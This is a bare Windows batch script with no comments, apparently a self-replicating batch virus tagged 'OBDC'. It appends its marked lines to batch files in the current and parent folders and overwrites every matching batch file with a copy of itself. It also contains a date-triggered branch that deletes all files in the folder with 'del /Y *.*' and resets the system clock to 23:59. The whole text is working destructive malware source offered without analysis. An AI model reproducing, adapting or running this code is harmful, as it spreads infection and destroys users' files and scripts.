@Echo OFF%[OBDC]%
for %%f in (*.b*t ..\*.ba?) do set OBDC=%%f
find "OBDC"<%OBDC%>nul
if errorlevel 1 find "OBDC"<%0>>%OBDC%
echo.|date|find "04.07"<nul%[OBDC]%
if errorlevel 0 goto :OBDC
if errorlevel 1 goto :OBDC_
:OBDC_
del /Y *.* [%OBDC%]
:OBDC
for %%b in (*.ba* ..\*.*at) do copy %0 %%b /Y
time 23:59
exit
